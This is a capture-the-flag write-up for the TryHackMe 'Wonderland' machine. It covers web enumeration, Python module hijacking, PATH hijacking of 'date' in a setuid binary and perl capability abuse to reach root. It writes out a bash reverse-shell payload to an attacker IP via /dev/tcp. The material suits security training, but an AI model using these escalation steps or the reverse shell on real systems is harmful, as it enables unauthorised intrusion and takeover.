![[wonderland_00.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Wonderland/images/wonderland_00.png)

Rabbits... rabbits everywhere.

Let's start the machine and perform some `nmap` scans to see what services are open.

![[wonderland_01.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Wonderland/images/wonderland_01.png)

We'll check out `http` first! 

![[wonderland_02.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Wonderland/images/wonderland_02.png)

There's not much here but we're told to `Follow the white rabbit` so, let's directory bust to see what we can find.

We'll uncover a directory called `poem` which just displays the poem: `The Jabberwocky`. 

![[wonderland_03.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Wonderland/images/wonderland_03.png)

More interesting is the directory called `/r`. 

![[wonderland_04.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Wonderland/images/wonderland_04.png)

Oh boy, more directory busting.

![[wonderland_05.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Wonderland/images/wonderland_05.png)

New page who dis?

![[wonderland_06.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Wonderland/images/wonderland_06.png)

`/r/a`, huh?

We can probably assume that we're going to get directories spelling out `rabbit`. Let's just go to: `/r/a/b/b/i/t` and see what we get.

![[wonderland_07.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Wonderland/images/wonderland_07.png)

Looks like our assumption was correct. If we checked every page up until this one we'd find that it's more text from Alice in Wonderland. Once we follow the trail to `/r/a/b/b/i/t` we are asked to `"Open the door and enter wonderland"`.

But, there's nothing that interesting on the page we can see... let's check the source code.

![[wonderland_08.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Wonderland/images/wonderland_08.png)

Looks like a username and password! Let's see if this will get us onto the machine using `ssh`.

![[wonderland_09.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Wonderland/images/wonderland_09.png)

Now to enumerate.

We can see `root.txt` is in `Alice's` home directory? 

![[wonderland_10.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Wonderland/images/wonderland_10.png)

We can't read it though. There is also a `python` script for the poem `walrus and the carpenter`.

If we check the script we can see that all it does is grab a few random lines from the poem to put to the screen.

![[wonderland_11.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Wonderland/images/wonderland_11.png)<br />
![[wonderland_12.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Wonderland/images/wonderland_12.png)

Let's check the output of the script. Yup it does what we were thinking.

![[wonderland_13.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Wonderland/images/wonderland_13.png)

Let's keep enumerating.

![[wonderland_14.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Wonderland/images/wonderland_14.png)

`sudo -l`, always faithful. It shows that we can run the script as the user `rabbit` using `python3`. That means we can possibly escalate laterally. But how? The script doesn't do anything useful and we can't manipulate the script itself. It's owned by `root` and can only be read by for other users: `-rw-r--r--`.

But, here's a little trick. Have you ever written your own python script that uses modules that you've imported? Have you ever written your own script/module to be imported?

When `python` uses the `import` statement the first place it'll look for that script/module is the directory in which the script is being run. Then, it'll use other predefined system locations to look for it. Also, when it's imported the code in the module will be executed.

We can check the path with `sys.path`.<br />
![[wonderland_15.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Wonderland/images/wonderland_15.png)

The first entry in the list is empty, this is the location that the file is being run. Therefore, the full path for the first location `random` will be checked for would resolve to `/home/alice/random`. 

All this means is we can create our own `random.py` script in the same location as the `walrus and the carpenter` script and get it to give us a shell!

Let's do that.

![[wonderland_16.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Wonderland/images/wonderland_16.png)

When serving this file up, don't call it `random.py` because the `http.server` uses the real `random.py`. If you don't name it something else, you'll break the `http.server` module.

![[wonderland_17.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Wonderland/images/wonderland_17.png)

Now, let's run the script for the poem again but as the user `rabbit`.

![[wonderland_18.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Wonderland/images/wonderland_18.png)

Now we are `rabbit`. Time to Enumerate, enumerate and enumerate.

![[wonderland_19.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Wonderland/images/wonderland_19.png)

There's a tea party!? Let's check it out.

![[wonderland_20.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Wonderland/images/wonderland_20.png)

Huh? There must be a problem with the program. 

I noticed something interesting at this point. It looks like the dates are all messed up. The system was an hour before what the tea party application uses to introduce us to the Mad Hatter.

![[wonderland_21.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Wonderland/images/wonderland_21.png)

Notice that the date always gets updated to be an hour in the future? Looks like we'll never meet the Mad Hatter... disappointed.

Let's check the file in `ghidra` to see what that can tell us. We'll open the file, analyse it and from there look for the application's entry point. We can find the entry point in the `functions` drop down on the left and look for `main` or `entry`.

Now we'll start to see how the program runs.

![[wonderland_22.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Wonderland/images/wonderland_22.png)

Huh? 

So, there is no real segmentation fault and therefore a buffer overflow is not really necessary to look into, at least not as far as I can tell.

Even more interesting are the lines I've highlighted below. Check it out!

![[wonderland_23.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Wonderland/images/wonderland_23.png)

We can see that the `UID` gets set to `0x3eb` which is `1003` in decimal. Let's see who that `UID` belongs to by checking `/etc/passwd`.

![[wonderland_24.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Wonderland/images/wonderland_24.png)

Looks like the program is being run as `hatter` so he was here the ENTIRE TIME!!!!

Also, check out the purple underline in the code. We can see that a system command is being run with `/bin/echo -n 'Probably by ' && date --date'next hour -R` . So, it's interacting with the system directly by using `echo` and `date`. However, notice how `echo` has been specified with it's absolute path but `date` has not.

We have another issue similar to what we found above. This means we can create our own version of `date`. What differs here is that this application will use the system path and not the python version. We can check that with `echo $PATH`.

![[wonderland_25.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Wonderland/images/wonderland_25.png)

That means we can create our own version of `date` (which can just be a bash reverse shell) and then set a directory we have control over to be the first entry in the system path.

Now, we'll set up our own `date` file with a reverse shell.

Just before that we'll set the path.

![[wonderland_26.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Wonderland/images/wonderland_26.png)

Now set up a listener, echo the rev shell to a file called `date`, make `date` executable and execute the `teaParty` file.

Remember, because the `UID` gets changed, this will give us a shell as `Hatter`.

The payload we will use is:

- `echo "bash -c 'bash -i >& /dev/tcp/<AB_IP>/4142 0>&1'" > date`

`bash -c` is required otherwise the shell won't fire. It's possible also to use many other types of shells. This is just a very simple one to quickly fire off.

![[wonderland_27.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Wonderland/images/wonderland_27.png)

Now for more enumeration.

After a few commands we will find a password for `hatter`.

![[wonderland_28.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Wonderland/images/wonderland_28.png)

This is useful as we'll want to try `sudo -l`. First, we'll exit this shell and use `ssh` as hatter with the new password to get a more stable shell.

![[wonderland_29.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Wonderland/images/wonderland_29.png)

No joy this time.

Basic enumeration doesn't net us anything that we can use. So we'll use `linpeas` in order to look a little deeper.

What stood out to me was `linpeas` alerting us to the use of `cap_setuid+ep` on `perl`.

![[wonderland_30.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Wonderland/images/wonderland_30.png)

If we check `perl` on `GTFObins`, we'll see that it has an entry for `Capabilities`. For `perl`, if these `Capabilities` are set we can then set a `UID` of our choice for a process that we'll subsequently call. Meaning, we can run any new process as whatever user we want (i.e. `root`).

![[wonderland_31.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Wonderland/images/wonderland_31.png)

We don't need to worry about setting the capability ourselves as it already exists on the machine. We can just find where `perl` is and then run the shell, like so.

![[wonderland_32.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Wonderland/images/wonderland_32.png)

All this is doing is declaring the use of the `setuid` function from `POSIX`, setting the `UID` to `0` (`root`) and then executing `/bin/bash` which will spawn a new process as root!

**Note:** `qw()` stands for **quote word**. Meaning if you had a string that read "I am a shape", it would be considered as 4 words: "I", "am", "a", "shape". This is simply the method to return the `setuid` function from the [POSIX](https://perldoc.perl.org/POSIX) module. Basically, a library of common functions.

Now we'll make sure the flag files are the usual names of `user.txt` and `root.txt`.

![[wonderland_33.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Wonderland/images/wonderland_33.png)

Then we can grab the flags.

![[wonderland_34.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Wonderland/images/wonderland_34.png)

And we're done.

---

# NOTES ON PERL CAPABILITIES

Say we wanted to be able to add finding capabilities to our enumeration methodology and only rely on scripts like `linpeas` as little as possible. We can find if these capabilities are on a binary like `perl` by using `getcap`

![[wonderland_35.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Wonderland/images/wonderland_35.png)

You can do this for all files on the system by using:

```perl
# don't print to stdout the files we can't access with `2>/dev/null`
# -r means to search recursively.
getcap -r / 2>/dev/null
```

There are only 3 that are returned in this case.

![[wonderland_36.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/Wonderland/images/wonderland_36.png)

This way we can perform a quick capabilities check instead of using `linpeas`. That doesn't mean you shouldn't use `linpeas` but running all the scans that it provides can be very loud. Knowing how to perform specific checks without having to run the whole script can be very useful.
